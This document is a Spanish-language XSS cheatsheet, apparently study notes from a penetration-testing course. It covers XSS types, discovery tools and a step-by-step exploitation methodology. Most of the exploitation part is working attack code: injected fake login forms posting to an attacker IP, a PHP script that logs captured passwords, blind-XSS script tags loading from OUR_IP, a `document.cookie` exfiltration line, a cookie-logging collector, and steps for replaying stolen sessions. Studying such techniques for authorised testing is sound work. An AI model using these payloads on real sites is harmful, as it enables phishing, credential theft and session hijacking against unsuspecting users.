# XSS Cheatsheet

## Tipos de XSS — Referencia Rápida

| Tipo | Persistente | Procesado en | Vector de ataque |
|------|-------------|--------------|-----------------|
| **Stored** | Si | Back-end + Browser | Payload guardado en BD, afecta a todos |
| **Reflected** | No | Back-end | URL maliciosa enviada a víctima |
| **DOM-based** | No | Browser (solo JS) | URL con `#`, sin request HTTP |

---

## Payloads de Verificacion

```html
<!-- Basico - confirmar ejecucion JS -->
<script>alert(window.origin)</script>

<!-- Cuando <script> esta bloqueado (innerHTML, DOM) -->
<img src="" onerror=alert(window.origin)>

<!-- Alternativas si alert() esta bloqueado -->
<script>print()</script>
<plaintext>
```

**Por que `window.origin`?** Revela exactamente en que dominio/iframe se ejecuto el payload — util cuando hay iframes de dominios cruzados.

---

## Identificar el Tipo de XSS

```
¿El input aparece en la pagina?
├── ¿Se hace un HTTP request? (ver Network tab en DevTools)
│   ├── SI → Reflected o Stored
│   │   └── ¿Persiste tras recargar la pagina?
│   │       ├── SI → **Stored XSS**
│   │       └── NO → **Reflected XSS** (copiar URL para explotar)
│   └── NO (URL usa #) → **DOM-based XSS**
```

---

## DOM XSS — Source & Sink

**Source** = donde entra el input del usuario:
```javascript
document.URL.indexOf("task=")  // parametro en URL
```

**Sink** = donde se escribe al DOM (funciones peligrosas):
```javascript
// JavaScript nativo
document.write()
element.innerHTML     // NO permite <script>, usar <img onerror>
element.outerHTML

// jQuery
.add() .after() .append()
```

**Regla:** Source + Sink sin sanitizacion = XSS.

---

## Reflected XSS — Explotar via URL

Si el request es `GET`, el payload va en la URL:
```
http://target.com/index.php?task=<script>alert(window.origin)</script>
```
Enviar esta URL a la victima — al visitarla, el payload se ejecuta.

---

## XSS Discovery

### Herramientas Automaticas

| Herramienta | Tipo | Comando clave |
|-------------|------|---------------|
| [XSStrike](https://github.com/s0md3v/XSStrike) | Open-source | `python xsstrike.py -u "http://target/page?param=test"` |
| [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) | Open-source | — |
| [XSSer](https://github.com/epsylon/xsser) | Open-source | — |
| Burp Pro / ZAP / Nessus | Paid/Free | Passive + Active scan |

```bash
# Instalar y usar XSStrike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike && pip install -r requirements.txt
python xsstrike.py -u "http://TARGET/index.php?task=test"
```

### Manual — Donde Inyectar

- Campos de formulario (comentarios, busqueda, tareas)
- Parametros en URL (`?q=`, `?task=`, `?search=`)
- HTTP Headers: `Cookie`, `User-Agent` (si se muestran en la pagina)

### Listas de Payloads

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [Payload-Box](https://github.com/payload-box/xss-payload-list)

### Code Review — Palabras Clave Peligrosas

**Front-end (JS):** `innerHTML`, `outerHTML`, `document.write`, `.append()`, `eval()`, `location.href`

**Verificar fuente renderizada:** `CTRL+SHIFT+C` (Web Inspector) vs `CTRL+U` (fuente estatica)

---

## Impacto Real de XSS

| Ataque | Descripcion |
|--------|-------------|
| **Session Hijacking** | Robar cookie de sesion → `document.cookie` |
| **Credential Theft** | Inyectar formulario falso de login |
| **Keylogger** | Capturar teclas con event listeners |
| **Phishing** | Redirigir a pagina maliciosa |
| **CSRF forzado** | Ejecutar API calls en nombre del usuario |
| **Crypto mining** | Usar CPU del navegador del victima |
| **Browser exploit** | Combinar con vuln del browser para RCE |

**Riesgo:** `Bajo impacto directo en back-end + Alta probabilidad = Riesgo MEDIO` → siempre remediar.

---

## Defacing (Stored XSS)

Cuatro elementos principales para modificar la apariencia de una pagina:

```javascript
// Color de fondo
document.body.style.background = "#141d2b"

// Imagen de fondo
document.body.background = "https://example.com/img.svg"

// Titulo de pagina
document.title = 'Hacked'

// Contenido HTML completo del body
document.getElementsByTagName('body')[0].innerHTML = '<center><h1>Hacked</h1></center>'

// Con jQuery (si esta importado)
$("#todo").html('New Text');
```

**Payload completo:**
```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color:white">Hacked</h1></center>'</script>
```

---

## Phishing — Inyectar Formulario Falso de Login

**1. Construir el formulario:**
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

**2. Inyectarlo con `document.write()` y limpiar el formulario original:**
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
```

- Agregar `<!--` al final del payload para comentar HTML residual.
- Usar `CTRL+SHIFT+C` → Page Inspector para encontrar el `id` del elemento a remover.

**3. Capturar credenciales con PHP:**
```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# Crear index.php:
```
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
```bash
sudo php -S 0.0.0.0:80
```

---

## Session Hijacking (Blind XSS)

**Blind XSS** = vulnerabilidad que se ejecuta en una pagina a la que no tienes acceso (ej: panel de admin, tickets de soporte, formularios de registro).

Posibles vectores de entrada ciegos: Contact Forms, Reviews, User Details, Support Tickets, HTTP `User-Agent` header.

### Paso 1 — Identificar el campo vulnerable

Usar un script remoto que identifica el campo por su nombre en la request:

```html
<!-- Cada campo lleva el nombre del input como path -->
<script src=http://OUR_IP/fullname></script>
<script src=http://OUR_IP/username></script>
<script src=http://OUR_IP/website></script>
```

Otros formatos de payload Blind XSS:
```html
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>$.getScript("http://OUR_IP")</script>
```

Iniciar listener:
```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

### Paso 2 — Robar la cookie de sesion

Crear `script.js` en el servidor:
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Payload XSS que carga el script:
```html
<script src=http://OUR_IP/script.js></script>
```

PHP para capturar y guardar cookies (`index.php`):
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

### Paso 3 — Usar la cookie robada

En Firefox → `Shift+F9` → Storage → agregar cookie manualmente:
- `Name` = parte antes del `=`
- `Value` = parte despues del `=`

Luego recargar la pagina para acceder como la victima.

---

## Limitaciones a Recordar

- XSS esta limitado al motor JS del browser (V8, SpiderMonkey, etc.)
- En browsers modernos: limitado al mismo dominio (Same-Origin Policy)
- `innerHTML` bloquea tags `<script>` → usar `<img onerror>` u otros event handlers
- Stored XSS puede requerir eliminar el payload directamente de la BD para remediarlo

---

## Quick Reference — Metodologia

```
1. Identificar inputs (forms, URL params, headers, User-Agent)
2. Probar: <script>alert(window.origin)</script>
3. Si bloqueado: <img src="" onerror=alert(window.origin)>
4. Ver Network tab: ¿hay HTTP request? → determinar tipo
5. Recargar pagina → ¿persiste? → Stored vs Reflected
6. Revisar URL con # → DOM-based
7. Para Reflected/DOM: construir URL maliciosa para victima
8. Para Stored: verificar que afecta a otros usuarios

--- Explotacion ---
9. Defacing      → document.body.style.background / innerHTML (Stored)
10. Phishing      → document.write(form) + php listener (Reflected/Stored)
11. Session Hijack → Blind XSS: script src + new Image().src + cookie (Blind/Stored)
```
